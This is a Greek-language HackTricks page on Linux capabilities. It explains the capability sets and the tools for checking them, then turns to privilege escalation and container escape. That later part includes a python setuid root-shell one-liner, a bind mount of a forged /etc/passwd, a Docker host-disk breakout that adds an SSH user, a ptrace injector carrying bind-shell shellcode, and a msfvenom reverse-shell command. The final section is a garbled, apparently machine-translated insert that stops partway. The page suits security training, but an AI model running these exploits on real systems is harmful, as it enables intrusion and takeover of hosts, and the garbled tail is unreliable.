# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Οι δυνατότητες του Linux διαιρούν **τα δικαιώματα root σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διαδικασίες να έχουν ένα υποσύνολο δικαιωμάτων. Αυτό ελαχιστοποιεί τους κινδύνους, αποφεύγοντας την άσκοπη χορήγηση πλήρων δικαιωμάτων root.

### Το Πρόβλημα:

- Οι κανονικοί χρήστες έχουν περιορισμένα δικαιώματα, επηρεάζοντας εργασίες όπως το άνοιγμα ενός δικτύου socket που απαιτεί πρόσβαση root.

### Σύνολα Δυνατοτήτων:

1. **Inherited (CapInh)**:

- **Σκοπός**: Καθορίζει τις δυνατότητες που μεταβιβάζονται από τη γονική διαδικασία.
- **Λειτουργικότητα**: Όταν δημιουργείται μια νέα διαδικασία, κληρονομεί τις δυνατότητες από τη γονική της διαδικασία σε αυτό το σύνολο. Χρήσιμο για τη διατήρηση ορισμένων δικαιωμάτων κατά τη διάρκεια των δημιουργιών διαδικασιών.
- **Περιορισμοί**: Μια διαδικασία δεν μπορεί να αποκτήσει δυνατότητες που δεν είχε η γονική της διαδικασία.

2. **Effective (CapEff)**:

- **Σκοπός**: Αντιπροσωπεύει τις πραγματικές δυνατότητες που χρησιμοποιεί μια διαδικασία σε οποιαδήποτε στιγμή.
- **Λειτουργικότητα**: Είναι το σύνολο των δυνατοτήτων που ελέγχει ο πυρήνας για να χορηγήσει άδεια για διάφορες λειτουργίες. Για τα αρχεία, αυτό το σύνολο μπορεί να είναι μια σημαία που υποδεικνύει αν οι επιτρεπόμενες δυνατότητες του αρχείου θα θεωρηθούν αποτελεσματικές.
- **Σημασία**: Το αποτελεσματικό σύνολο είναι κρίσιμο για άμεσους ελέγχους δικαιωμάτων, λειτουργώντας ως το ενεργό σύνολο δυνατοτήτων που μπορεί να χρησιμοποιήσει μια διαδικασία.

3. **Permitted (CapPrm)**:

- **Σκοπός**: Ορίζει το μέγιστο σύνολο δυνατοτήτων που μπορεί να έχει μια διαδικασία.
- **Λειτουργικότητα**: Μια διαδικασία μπορεί να ανυψώσει μια δυνατότητα από το επιτρεπόμενο σύνολο στο αποτελεσματικό της σύνολο, δίνοντάς της τη δυνατότητα να χρησιμοποιήσει αυτή τη δυνατότητα. Μπορεί επίσης να απορρίψει δυνατότητες από το επιτρεπόμενο σύνολό της.
- **Όριο**: Λειτουργεί ως ανώτατο όριο για τις δυνατότητες που μπορεί να έχει μια διαδικασία, διασφαλίζοντας ότι μια διαδικασία δεν θα υπερβεί το προκαθορισμένο πεδίο δικαιωμάτων της.

4. **Bounding (CapBnd)**:

- **Σκοπός**: Θέτει ένα ανώτατο όριο στις δυνατότητες που μπορεί να αποκτήσει μια διαδικασία κατά τη διάρκεια του κύκλου ζωής της.
- **Λειτουργικότητα**: Ακόμη και αν μια διαδικασία έχει μια συγκεκριμένη δυνατότητα στο κληρονομούμενο ή επιτρεπόμενο σύνολο, δεν μπορεί να αποκτήσει αυτή τη δυνατότητα εκτός αν είναι επίσης στο περιοριστικό σύνολο.
- **Χρήση**: Αυτό το σύνολο είναι ιδιαίτερα χρήσιμο για τον περιορισμό της δυνατότητας ανύψωσης δικαιωμάτων μιας διαδικασίας, προσθέτοντας ένα επιπλέον επίπεδο ασφάλειας.

5. **Ambient (CapAmb)**:
- **Σκοπός**: Επιτρέπει σε ορισμένες δυνατότητες να διατηρούνται κατά τη διάρκεια μιας κλήσης συστήματος `execve`, η οποία συνήθως θα οδηγούσε σε πλήρη επαναφορά των δυνατοτήτων της διαδικασίας.
- **Λειτουργικότητα**: Διασφαλίζει ότι τα προγράμματα που δεν είναι SUID και δεν έχουν σχετικές δυνατότητες αρχείου μπορούν να διατηρήσουν ορισμένα δικαιώματα.
- **Περιορισμοί**: Οι δυνατότητες σε αυτό το σύνολο υπόκεινται στους περιορισμούς των κληρονομούμενων και επιτρεπόμενων συνόλων, διασφαλίζοντας ότι δεν θα υπερβούν τα επιτρεπόμενα δικαιώματα της διαδικασίας.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Για περισσότερες πληροφορίες ελέγξτε:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Δυνατότητες Διαδικασιών & Εκτελέσιμων Αρχείων

### Δυνατότητες Διαδικασιών

Για να δείτε τις δυνατότητες για μια συγκεκριμένη διαδικασία, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Καθώς παρέχει περισσότερες λεπτομέρειες, ας περιορίσουμε τις πληροφορίες μόνο στις σχετικές με τις δυνατότητες του Linux.\
Σημειώστε ότι για όλες τις εκτελούμενες διαδικασίες, οι πληροφορίες δυνατότητας διατηρούνται ανά νήμα, ενώ για τα εκτελέσιμα αρχεία στο σύστημα αρχείων αποθηκεύονται σε επεκτάσιμες ιδιότητες.

Μπορείτε να βρείτε τις δυνατότητες που ορίζονται στο /usr/include/linux/capability.h

Μπορείτε να βρείτε τις δυνατότητες της τρέχουσας διαδικασίας με `cat /proc/self/status` ή κάνοντας `capsh --print` και άλλων χρηστών στο `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Αυτή η εντολή θα πρέπει να επιστρέφει 5 γραμμές στα περισσότερα συστήματα.

- CapInh = Κληρονομούμενες ικανότητες
- CapPrm = Επιτρεπόμενες ικανότητες
- CapEff = Αποτελεσματικές ικανότητες
- CapBnd = Σύνολο περιορισμών
- CapAmb = Σύνολο περιβαλλοντικών ικανοτήτων
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Αυτοί οι δεκαεξαδικοί αριθμοί δεν έχουν νόημα. Χρησιμοποιώντας το capsh utility μπορούμε να τους αποκωδικοποιήσουμε στα ονόματα των δυνατοτήτων.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Ας ελέγξουμε τώρα τις **ικανότητες** που χρησιμοποιεί το `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Αν και αυτό λειτουργεί, υπάρχει ένας άλλος και πιο εύκολος τρόπος. Για να δείτε τις δυνατότητες μιας εκτελούμενης διαδικασίας, απλώς χρησιμοποιήστε το **getpcaps** εργαλείο ακολουθούμενο από το αναγνωριστικό της διαδικασίας (PID). Μπορείτε επίσης να παρέχετε μια λίστα αναγνωριστικών διαδικασιών.
```bash
getpcaps 1234
```
Ας ελέγξουμε εδώ τις δυνατότητες του `tcpdump` αφού δώσουμε στο δυαδικό αρχείο αρκετές δυνατότητες (`cap_net_admin` και `cap_net_raw`) για να καταγράψει το δίκτυο (_tcpdump εκτελείται στη διαδικασία 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Όπως μπορείτε να δείτε, οι δοθείσες δυνατότητες αντιστοιχούν με τα αποτελέσματα των 2 τρόπων απόκτησης των δυνατοτήτων ενός δυαδικού αρχείου.\
Το εργαλείο _getpcaps_ χρησιμοποιεί την κλήση συστήματος **capget()** για να ερωτήσει τις διαθέσιμες δυνατότητες για ένα συγκεκριμένο νήμα. Αυτή η κλήση συστήματος χρειάζεται μόνο να παρέχει το PID για να αποκτήσει περισσότερες πληροφορίες.

### Δυνατότητες Δυαδικών Αρχείων

Τα δυαδικά αρχεία μπορούν να έχουν δυνατότητες που μπορούν να χρησιμοποιηθούν κατά την εκτέλεση. Για παράδειγμα, είναι πολύ συνηθισμένο να βρείτε το δυαδικό αρχείο `ping` με τη δυνατότητα `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Μπορείτε να **αναζητήσετε δυαδικά αρχεία με δυνατότητες** χρησιμοποιώντας:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Αν αφαιρέσουμε τις δυνατότητες CAP*NET_RAW για το \_ping*, τότε το εργαλείο ping δεν θα πρέπει να λειτουργεί πλέον.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Εκτός από την έξοδο του _capsh_ αυτού καθαυτού, η εντολή _tcpdump_ θα πρέπει επίσης να προκαλέσει ένα σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Το σφάλμα δείχνει ξεκάθαρα ότι η εντολή ping δεν επιτρέπεται να ανοίξει ένα ICMP socket. Τώρα ξέρουμε σίγουρα ότι αυτό λειτουργεί όπως αναμενόταν.

### Αφαίρεση Δυνατοτήτων

Μπορείτε να αφαιρέσετε τις δυνατότητες ενός δυαδικού αρχείου με
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Φαίνεται ότι **είναι δυνατόν να ανατεθούν ικανότητες και σε χρήστες**. Αυτό πιθανώς σημαίνει ότι κάθε διαδικασία που εκτελείται από τον χρήστη θα μπορεί να χρησιμοποιεί τις ικανότητες του χρήστη.\
Βασισμένο σε [αυτό](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [αυτό](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) και [αυτό](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) πρέπει να ρυθμιστούν μερικά αρχεία για να δοθούν σε έναν χρήστη ορισμένες ικανότητες, αλλά αυτό που αναθέτει τις ικανότητες σε κάθε χρήστη θα είναι το `/etc/security/capability.conf`.\
Παράδειγμα αρχείου:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Περιβαλλοντικές Ικανότητες

Με τη σύνταξη του παρακάτω προγράμματος είναι δυνατό να **δημιουργηθεί ένα bash shell μέσα σε ένα περιβάλλον που παρέχει ικανότητες**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Μέσα στο **bash που εκτελείται από το συμπιεσμένο δυαδικό περιβάλλον** είναι δυνατόν να παρατηρηθούν οι **νέες δυνατότητες** (ένας κανονικός χρήστης δεν θα έχει καμία δυνατότητα στην "τρέχουσα" ενότητα).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Μπορείτε **μόνο να προσθέσετε ικανότητες που είναι παρούσες** και στα δύο σύνολα, το επιτρεπόμενο και το κληρονομούμενο.

### Ικανότητες ευαισθητοποίησης/Ικανότητες χωρίς ευαισθητοποίηση

Οι **δυαδικοί κώδικες με ευαισθητοποίηση ικανοτήτων δεν θα χρησιμοποιήσουν τις νέες ικανότητες** που παρέχονται από το περιβάλλον, ωστόσο οι **δυαδικοί κώδικες χωρίς ευαισθητοποίηση θα τις χρησιμοποιήσουν** καθώς δεν θα τις απορρίψουν. Αυτό καθιστά τους δυαδικούς κώδικες χωρίς ευαισθητοποίηση ευάλωτους μέσα σε ένα ειδικό περιβάλλον που παρέχει ικανότητες στους δυαδικούς κώδικες.

## Ικανότητες Υπηρεσίας

Από προεπιλογή, μια **υπηρεσία που εκτελείται ως root θα έχει ανατεθεί σε όλες τις ικανότητες**, και σε ορισμένες περιπτώσεις αυτό μπορεί να είναι επικίνδυνο.\
Επομένως, ένα **αρχείο διαμόρφωσης υπηρεσίας** επιτρέπει να **καθορίσετε** τις **ικανότητες** που θέλετε να έχει, **και** τον **χρήστη** που θα πρέπει να εκτελεί την υπηρεσία για να αποφευχθεί η εκτέλεση μιας υπηρεσίας με περιττά προνόμια:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Δυνατότητες σε κοντέινερ Docker

Από προεπιλογή, το Docker ανα assigns μερικές δυνατότητες στα κοντέινερ. Είναι πολύ εύκολο να ελέγξετε ποιες είναι αυτές οι δυνατότητες εκτελώντας:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Οι δυνατότητες είναι χρήσιμες όταν **θέλετε να περιορίσετε τις δικές σας διεργασίες μετά την εκτέλεση προνομιακών λειτουργιών** (π.χ. μετά την εγκατάσταση chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να εκμεταλλευτούν περνώντας κακόβουλες εντολές ή παραμέτρους που εκτελούνται ως root.

Μπορείτε να επιβάλετε δυνατότητες σε προγράμματα χρησιμοποιώντας `setcap`, και να τις ελέγξετε χρησιμοποιώντας `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Το `+ep` σημαίνει ότι προσθέτετε την ικανότητα (“-” θα την αφαιρούσε) ως Ενεργή και Επιτρεπόμενη.

Για να εντοπίσετε προγράμματα σε ένα σύστημα ή φάκελο με ικανότητες:
```bash
getcap -r / 2>/dev/null
```
### Παράδειγμα εκμετάλλευσης

Στο παρακάτω παράδειγμα, το δυαδικό αρχείο `/usr/bin/python2.6` βρέθηκε ευάλωτο σε privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Δυνατότητες** που απαιτούνται από το `tcpdump` για **να επιτρέπουν σε οποιονδήποτε χρήστη να καταγράφει πακέτα**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Η ειδική περίπτωση των "κενών" ικανοτήτων

[Από τα έγγραφα](https://man7.org/linux/man-pages/man7/capabilities.7.html): Σημειώστε ότι μπορεί κανείς να αναθέσει κενές ικανότητες σε ένα αρχείο προγράμματος, και έτσι είναι δυνατό να δημιουργηθεί ένα πρόγραμμα set-user-ID-root που αλλάζει την αποτελεσματική και αποθηκευμένη set-user-ID της διαδικασίας που εκτελεί το πρόγραμμα σε 0, αλλά δεν παρέχει καμία ικανότητα σε αυτή τη διαδικασία. Ή, απλά, αν έχετε ένα δυαδικό που:

1. δεν ανήκει στον root
2. δεν έχει ρυθμισμένα bits `SUID`/`SGID`
3. έχει κενές ικανότητες (π.χ.: `getcap myelf` επιστρέφει `myelf =ep`)

τότε **αυτό το δυαδικό θα εκτελείται ως root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι μια εξαιρετικά ισχυρή ικανότητα του Linux, συχνά ισοδύναμη με επίπεδο κοντά στον root λόγω των εκτενών **διοικητικών προνομίων** της, όπως η τοποθέτηση συσκευών ή η χειραγώγηση χαρακτηριστικών του πυρήνα. Ενώ είναι απαραίτητη για κοντέινερ που προσομοιώνουν ολόκληρα συστήματα, **το `CAP_SYS_ADMIN` θέτει σημαντικές προκλήσεις ασφάλειας**, ειδικά σε κοντεϊνερικές περιβάλλοντα, λόγω της δυνατότητάς του για κλιμάκωση προνομίων και συμβιβασμό του συστήματος. Επομένως, η χρήση του απαιτεί αυστηρές αξιολογήσεις ασφάλειας και προσεκτική διαχείριση, με ισχυρή προτίμηση για την απόρριψη αυτής της ικανότητας σε κοντέινερ συγκεκριμένων εφαρμογών για να τηρηθεί η **αρχή της ελάχιστης προνομίας** και να ελαχιστοποιηθεί η επιφάνεια επίθεσης.

**Παράδειγμα με δυαδικό**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Χρησιμοποιώντας python, μπορείτε να τοποθετήσετε ένα τροποποιημένο _passwd_ αρχείο πάνω από το πραγματικό _passwd_ αρχείο:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Και τελικά **mount** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Και θα μπορείτε να **`su` ως root** χρησιμοποιώντας τον κωδικό "password".

**Παράδειγμα με περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες δυνατότητες μέσα στο κοντέινερ docker χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Μέσα στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα SYS_ADMIN είναι ενεργοποιημένη.

- **Mount**

Αυτό επιτρέπει στο docker container να **τοποθετήσει τον δίσκο του host και να έχει ελεύθερη πρόσβαση σε αυτόν**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση στον δίσκο του docker host.\
Σε περίπτωση που διαπιστώσετε ότι ο host εκτελεί έναν **ssh** server, μπορείτε να **δημιουργήσετε έναν χρήστη μέσα στον δίσκο του docker host** και να αποκτήσετε πρόσβαση μέσω SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Αυτό σημαίνει ότι μπορείτε να ξεφύγετε από το κοντέινερ εισάγοντας ένα shellcode μέσα σε κάποια διαδικασία που εκτελείται μέσα στον κεντρικό υπολογιστή.** Για να έχετε πρόσβαση σε διαδικασίες που εκτελούνται μέσα στον κεντρικό υπολογιστή, το κοντέινερ πρέπει να εκτελείται τουλάχιστον με **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης λειτουργιών αποσφαλμάτωσης και παρακολούθησης κλήσεων συστήματος που παρέχονται από το `ptrace(2)` και κλήσεις διασύνδεσης μνήμης όπως το `process_vm_readv(2)` και το `process_vm_writev(2)`. Αν και είναι ισχυρό για διαγνωστικούς και παρακολούθησης σκοπούς, εάν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα όπως ένα φίλτρο seccomp στο `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να εκμεταλλευτεί για να παρακάμψει άλλους περιορισμούς ασφαλείας, ιδίως αυτούς που επιβάλλονται από το seccomp, όπως αποδεικνύεται από [αποδείξεις έννοιας (PoC) όπως αυτή](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Παράδειγμα με δυαδικό (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Παράδειγμα με δυαδικό (gdb)**

`gdb` με ικανότητα `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
# Δημιουργία Shellcode με msfvenom για Εισαγωγή στη Μνήμη μέσω gdb

Για να δημιουργήσετε ένα shellcode με το msfvenom που θα εισαχθεί στη μνήμη μέσω gdb, μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c
```

Αυτή η εντολή θα δημιουργήσει ένα shellcode που θα συνδεθεί πίσω στον καθορισμένο διευθυντή IP και θύρα.

## Εισαγωγή στη Μνήμη με gdb

Αφού έχετε το shellcode, μπορείτε να το εισάγετε στη μνήμη χρησιμοποιώντας το gdb. Ακολουθήστε τα παρακάτω βήματα:

1. Εκκινήστε το gdb με το εκτελέσιμο αρχείο σας:
   ```bash
   gdb ./your_executable
   ```

2. Ρυθμίστε ένα breakpoint στο σημείο που θέλετε να εισάγετε το shellcode:
   ```gdb
   (gdb) break *0x<address>
   ```

3. Ξεκινήστε την εκτέλεση του προγράμματος:
   ```gdb
   (gdb) run
   ```

